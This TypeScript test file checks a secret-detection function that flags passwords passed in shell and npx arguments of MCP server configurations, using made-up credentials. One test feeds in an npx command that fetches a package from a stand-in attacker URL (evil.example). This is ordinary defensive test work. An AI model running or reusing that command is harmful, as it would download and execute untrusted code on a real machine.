import { readFileSync } from 'node:fs';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { describe, expect, it } from 'vitest';
import { findArgSecrets } from './config-secrets.js';
import { shellWords } from './script-command.js';

const values = (command: string, args: string[]) => findArgSecrets(args, command).map((s) => s.value).sort();

describe('findArgSecrets — credentials inside a shell script argument', () => {
  it.each([
    ['mysql glued -p', 'sh', ['-c', 'mysql -uroot -pGlUeDsh7Kq2Lm9 db'], ['GlUeDsh7Kq2Lm9']],
    ['PGPASSWORD prefix', 'bash', ['-c', 'PGPASSWORD=PgPw8Zr2Lq7Xm4Tn psql -h db -U app app'], ['PgPw8Zr2Lq7Xm4Tn']],
    ['URL user:password', 'sh', ['-c', 'node s.js postgres://u:UrLPw8Kq2Zm7Xr@h/db'], ['UrLPw8Kq2Zm7Xr']],
    ['curl -u', 'sh', ['-c', 'curl -u admin:CuRlPw8Zq3Lm7Xr https://x.example/api'], ['CuRlPw8Zq3Lm7Xr']],
    ['mysql separate -p, a credential-looking value', 'sh', ['-c', 'mysql -u root -p Rt5Yq8Lm2Zx7Kw4Pn db'], ['Rt5Yq8Lm2Zx7Kw4Pn']],
    ['sshpass separate -p', 'sh', ['-c', 'sshpass -p plainpass99 ssh box'], ['plainpass99']],
    ['a later command of the script', 'bash', ['-lc', 'cd /srv && sshpass -p plainpass99 ssh box'], ['plainpass99']],
    ['a shell inside the script', 'sh', ['-c', `bash -c 'mysql -pGlUeDsh7Kq2Lm9 db'`], ['GlUeDsh7Kq2Lm9']],
    ['env-wrapped shell', 'env', ['-S', 'bash', '-c', 'mysql -pGlUeDsh7Kq2Lm9 db'], ['GlUeDsh7Kq2Lm9']],
  ])('%s', (_label, command, args, secrets) => {
    expect(values(command, args)).toEqual(secrets);
    for (const s of findArgSecrets(args, command)) {
      expect(s.location).toBe(`args[${args.length - 1}]`);
      expect(s.masked).not.toContain(s.value);
    }
  });

  it.each([
    ['mysql -p names the database', 'sh', ['-c', 'mysql -u root -p app_db']],
    ['psql -p is a port', 'sh', ['-c', 'psql -h db -p 5432 app']],
    ['a reference', 'sh', ['-c', 'mysql -p"$MYSQL_PWD" db && PGPASSWORD=$PGPW psql app']],
    ['docker -u', 'sh', ['-c', 'docker run -u 1000:1000 img']],
    ['not a shell script', 'node', ['-c', 'mysql -pGlUeDsh7Kq2Lm9 db']],
  ])('%s is not a credential', (_label, command, args) => {
    expect(values(command, args)).toEqual([]);
  });

  // The shared corpus's command strings wrapped in `sh -c`: MCP-003 agrees with the masker
  interface ArgvCase { name: string; command?: string; secrets: string[] }
  const corpus = JSON.parse(readFileSync(join(dirname(fileURLToPath(import.meta.url)), '..', '..', 'probe', 'testdata', 'argv-verdicts.json'), 'utf-8')) as { cases: ArgvCase[] };
  for (const c of corpus.cases.filter((x) => x.command && /^(?:sh|bash) -c /.test(x.command))) {
    it(`shared corpus: ${c.name}`, () => {
      const [command, ...args] = shellWords(c.command!);
      expect(values(command, args)).toEqual([...c.secrets].sort());
    });
  }
});

describe('findArgSecrets — a package runner -p', () => {
  it('before the package is --package', () => {
    expect(values('npx', ['-y', '-p', 'https://evil.example/x.tgz', 'mcp-server'])).toEqual([]);
    expect(values('npx', ['-p', 'Xk9mP2qR7vL4wZt8Hn3', 'mcp-server'])).toEqual([]);
    expect(values('npm', ['exec', '-p', 'Xk9mP2qR7vL4wZt8Hn3', '--', 'mcp-server'])).toEqual([]);
  });

  it('after the package is the server option', () => {
    expect(values('npx', ['-y', '@benborla29/mcp-server-mysql', '-p', 'Np4Xk9mP2qR7vL4wZt8'])).toEqual(['Np4Xk9mP2qR7vL4wZt8']);
    expect(values('npx', ['-y', 'mcp-server', '-p', '8080'])).toEqual([]);
  });
});
